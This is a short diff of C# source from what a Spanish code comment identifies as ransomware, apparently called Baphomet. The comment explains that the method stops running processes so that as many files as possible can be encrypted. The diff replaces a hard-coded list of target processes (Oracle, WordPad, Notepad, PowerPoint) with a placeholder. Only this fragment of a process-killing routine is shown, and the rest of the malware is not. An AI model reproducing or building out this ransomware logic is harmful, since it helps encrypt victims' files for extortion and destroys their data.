@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Text;
 using System.Diagnostics;
@@ -15,13 +15,7 @@ namespace Baphomet.Utilities
         //Aqui coloco los procesos que deseo detener para poder cifrar la mayor cantidad de archivos posibles.
         public void CheckProccess()
         {
-            var validProccess = new []
-            {
-                "oracle",
-                "wordpad",
-                "notepad",
-                "powerpnt"
-            };
+            var validProccess = new[] {"<processes list here>"};
 
             foreach (var proccessName in validProccess)
             {
